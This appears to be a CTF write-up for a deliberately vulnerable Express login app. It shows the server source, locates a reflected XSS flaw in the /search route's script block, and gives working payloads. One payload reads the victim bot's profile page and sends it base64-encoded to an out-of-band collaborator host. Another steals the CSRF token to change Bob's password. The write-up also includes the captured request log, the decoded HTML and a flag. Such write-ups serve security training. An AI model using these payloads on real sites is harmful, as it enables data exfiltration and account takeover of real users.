## js code

<details>
  <summary>js code</summary>

```javascript
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const puppeteer = require('puppeteer');

// --------------------------------------------------Auxiliary Code
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: true
}));

app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = generateCSRFToken();
    }
    next();
});

const crypto = require('crypto');

function generateCSRFToken() {
    return crypto.randomBytes(32).toString('hex');
}

function verifyCSRF(req, res) {
    const tokenFromBody = req.body._csrf;
    const tokenFromSession = req.session.csrfToken;
    return tokenFromBody && tokenFromSession && tokenFromBody === tokenFromSession;
}

function escapeHTML(str) {
    return String(str).replace(/[&<>'"`=\/]/g, function (char) {
        return {
            '&': '&amp;',
            '<': '&lt;',    
            '>': '&gt;',
            "'": '&#x27;',
            '"': '&quot;',
            '`': '&#x60;',
            '=': '&#x3D;',
            '/': '&#x2F;'
        }[char];
    });
}

// Insecure in-memory users database, only for XSS challenge purposes
const users = {
    alice: { username: 'alice', password: 'pass', bio: 'Hi, I am Alice!' },
    bob: { username: 'bob', password: process.env.PASSWORD, bio: 'Hello from Bob!' }
};

let sharedComments = [];

function isAuthenticated(req) {
    return req.session && req.session.username && users[req.session.username];
}

function renderHTML(filePath, replacements = {}) {
    let content = fs.readFileSync(path.join(__dirname, 'public', filePath), 'utf-8');
    for (let key in replacements) {
        const regex = new RegExp(`{{${key}}}`, 'g');
        content = content.replace(regex, replacements[key]);
    }
    return content;
}

// -------------------------------------------- Routes

app.get('/', (req, res) => {
    if (isAuthenticated(req)) return res.redirect('/profile');
    res.send(renderHTML('login.html', { error: '' }));
});

// Insecure login flow, only for XSS challenge purposes
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (users[username] && users[username].password === password) {
        req.session.username = username;

        // Set masterkey cookie
        let masterKeyValue = '';

        if (username === 'alice') {
            masterKeyValue = 'DEMOMASTERKEY';
        } else if (username === 'bob') {
            try {
                masterKeyValue = fs.readFileSync('/tmp/masterkey.txt', 'utf8').trim();
            } catch (err) {
                console.error('[!] Failed to read /tmp/masterkey.txt:', err);
                masterKeyValue = 'ERROR';
            }
        }

        res.cookie('masterkey', masterKeyValue, {
            httpOnly: true, // NOT Accessible by javascript code
        });

        return res.redirect('/profile');
    }

    res.send(renderHTML('login.html', { error: '<p class="error">Invalid credentials</p>', csrfToken: req.session.csrfToken }));
});

app.get('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const user = users[req.session.username];
    res.send(renderHTML('profile.html', {
        username: escapeHTML(user.username),
        bio: escapeHTML(user.bio),
        csrfToken: req.session.csrfToken}));
});

app.post('/profile', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
    const { bio, password } = req.body;
    const user = users[req.session.username];
    user.bio = bio;
    if (password && password.trim()) user.password = password;
    res.redirect('/profile');
});

app.get('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    const commentHTML = sharedComments.map(c =>
        `<li><strong>${escapeHTML(c.author)}:</strong> ${escapeHTML(c.text)}</li>`
    ).join('');
    res.send(renderHTML('shared.html', { comments: commentHTML, csrfToken: req.session.csrfToken }));
});

app.post('/shared', (req, res) => {
    if (!isAuthenticated(req)) return res.redirect('/');
    if (!verifyCSRF(req, res)) return res.status(403).send('Invalid CSRF token');
    const comment = {
        author: req.session.username,
        text: req.body.comment
    };
    sharedComments.push(comment);
    res.redirect('/shared');
});

app.get('/search', (req, res) => {
    if (!isAuthenticated(req)) return res.status(401).send('Unauthorized');

    const query = req.query.query || '';
    if (!query) return res.status(400).send('Query parameter is required');

    const results = sharedComments.filter(c => 
        c.text.includes(query)
    );

    let resultsHTML = '';
    if (results.length === 0) {
        resultsHTML = `<p>No matches found.</p>`;
    } else {
        resultsHTML = '<ul>';
        results.forEach(c => {
            resultsHTML += `<li><strong>${escapeHTML(c.author)}:</strong> ${escapeHTML(c.text)}</li>`;
        });
        resultsHTML += '</ul>';
    }

    const responseHTML = `
        <html>
        <head><title>Search Results</title></head>
        <body>
            <div id="results-header"></div>
            <script>
                var searchQuery = "${query}";
                document.getElementById('results-header').innerHTML = '<h2>Search Results for "' + searchQuery + '"</h2>';
            </script>
            ${resultsHTML}
            <br><a href="/shared">Back to Shared Area</a>
        </body>
        </html>
    `;

    res.send(responseHTML);
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => {
        res.redirect('/');
    });
});

app.get('/report', async (req, res) => {
    res.send('Bob is checking it out...');

    // Bob's logic
});

app.listen(80, () => {
    console.log('Running on http://localhost:80');
});

```

  
</details>

---

## here is we can inject xss here

```javascript
 const responseHTML = `
        <html>
        <head><title>Search Results</title></head>
        <body>
            <div id="results-header"></div>
            <script>
                var searchQuery = "${query}";
                document.getElementById('results-header').innerHTML = '<h2>Search Results for "' + searchQuery + '"</h2>';
            </script>
            ${resultsHTML}
            <br><a href="/shared">Back to Shared Area</a>
        </body>
        </html>
    `;
```

---

```
'"</h2>';</script><script>alert(5)</script>
http://3.252.72.221/search?query=%27%22%3C%2Fh2%3E%27%3B%3C%2Fscript%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E
```

<img width="1147" height="405" alt="image" src="https://github.com/user-attachments/assets/e4e16bd4-e08a-45d8-a549-8b8cf193cd0a" />

## check first if paylaod send to bob

```html
</h2>';</script><script>
fetch('http://localhost/profile', {method: 'GET', credentials: 'include'})
  .then(r => r.text())
  .then(data => {
    
    fetch('http://crudrnshcmhythtyywai7uanxa8alegy6.oast.fun/?p=' + btoa(data));
  });
</script>

```

**`response`**

```
GET /?p=PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+UHJvZmlsZTwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvc3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgyPldlbGNvbWUsIGJvYiE8L2gyPgogICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ii9wcm9maWxlIj4KICAgICAgPGxhYmVsPkJpbzo8L2xhYmVsPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IjIwNjI1MWRiYjBmYzkyMThhYzIwYzM4MjJkZjA1NzQ1ODI4YzU3OWVhYTRjNjg3YjY3ZjIzZGNiNmZlZGVmZTgiPgogICAgICA8aW5wdXQgbmFtZT0iYmlvIiB2YWx1ZT0iSGVsbG8gZnJvbSBCb2IhIj48YnI+CiAgICAgIDxsYWJlbD5OZXcgUGFzc3dvcmQ6PC9sYWJlbD4KICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkxlYXZlIGJsYW5rIHRvIGtlZXAgY3VycmVudCI+PGJyPgogICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+VXBkYXRlPC9idXR0b24+CiAgICA8L2Zvcm0+CiAgICA8ZGl2IGNsYXNzPSJuYXYiPgogICAgICAgIDxhIGhyZWY9Ii9zaGFyZWQiPkdvIHRvIFNoYXJlZCBBcmVhPC9hPiB8CiAgICAgICAgPGEgaHJlZj0iL2xvZ291dCIgc3R5bGU9ImNvbG9yOiByZWQ7Ij5Mb2dvdXQ8L2E+CiAgICAgIDwvZGl2PgogIDwvZGl2Pgo8L2JvZHk+Cgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgzPlJlcG9ydCBhIFVSTCBmb3IgQm9iIHRvIHZpc2l0PC9oMz4KICAgIDxmb3JtIG1ldGhvZD0iR0VUIiBhY3Rpb249Ii9yZXBvcnQiPgogICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXJsIiBwbGFjZWhvbGRlcj0iaHR0cDovL2xvY2FsaG9zdC9zb21ldGhpbmciIHJlcXVpcmVkPgogICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+UmVwb3J0IHRvIEJvYjwvYnV0dG9uPgogICAgPC9mb3JtPgo8L2Rpdj4KPC9odG1sPgo= HTTP/1.1
Host: crudrnshcmhythtyywai7uanxa8alegy6.oast.fun
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Origin: http://localhost
Referer: http://localhost/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/140.0.0.0 Safari/537.36

```

> ### after decode the base64

```html
<!DOCTYPE html>
<html>
<head>
  <title>Profile</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <div class="container">
    <h2>Welcome, bob!</h2>
    <form method="POST" action="/profile">
      <label>Bio:</label>
      <input type="hidden" name="_csrf" value="206251dbb0fc9218ac20c3822df05745828c579eaa4c687b67f23dcb6fedefe8">
      <input name="bio" value="Hello from Bob!"><br>
      <label>New Password:</label>
      <input type="password" name="password" placeholder="Leave blank to keep current"><br>
      <button type="submit">Update</button>
    </form>
    <div class="nav">
        <a href="/shared">Go to Shared Area</a> |
        <a href="/logout" style="color: red;">Logout</a>
      </div>
  </div>
</body>

<div class="container">
    <h3>Report a URL for Bob to visit</h3>
    <form method="GET" action="/report">
      <input type="text" name="url" placeholder="http://localhost/something" required>
      <button type="submit">Report to Bob</button>
    </form>
</div>
</html>

```

## change password of bob

```
http://localhost/search?query=%3C%2Fh2%3E%27%3B%3C%2Fscript%3E%3Cscript%3E%0Afetch(%27http%3A%2F%2Flocalhost%2Fprofile%27%2C%20%7B%0A%20%20method%3A%20%27GET%27%2C%0A%20%20credentials%3A%20%27include%27%20%0A%7D)%0A.then(r%20%3D%3E%20r.text())%0A.then(html%20%3D%3E%20%7B%0A%20%20%0A%20%20const%20parser%20%3D%20new%20DOMParser()%3B%0A%20%20const%20doc%20%3D%20parser.parseFromString(html%2C%20%27text%2Fhtml%27)%3B%0A%0A%20%20const%20token%20%3D%20doc.querySelector(%27input%5Bname%3D%22_csrf%22%5D%27).value%3B%0A%0A%20%20%0A%20%20const%20params%20%3D%20new%20URLSearchParams()%3B%0A%20%20params.append(%27_csrf%27%2C%20token)%3B%0A%20%20params.append(%27bio%27%2C%20%27Hacked%20by%20XSS%27)%3B%20%0A%20%20params.append(%27password%27%2C%20%27NewPass123%27)%3B%20%0A%0A%20%20%0A%20%20fetch(%27%2Fprofile%27%2C%20%7B%0A%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20headers%3A%20%7B%20%27Content-Type%27%3A%20%27application%2Fx-www-form-urlencoded%27%20%7D%2C%0A%20%20%20%20body%3A%20params.toString()%2C%0A%20%20%20%20credentials%3A%20%27include%27%0A%20%20%7D)%3B%0A%7D)%3B%0A%3C%2Fscript%3E%0A
```

```
bob : NewPass123
```

<img width="1663" height="695" alt="image" src="https://github.com/user-attachments/assets/a451eb7b-f684-46ba-9bb4-bb27022ca8e8" />

```
1a9a9b69e72fc58b2870ac167d948b00
```

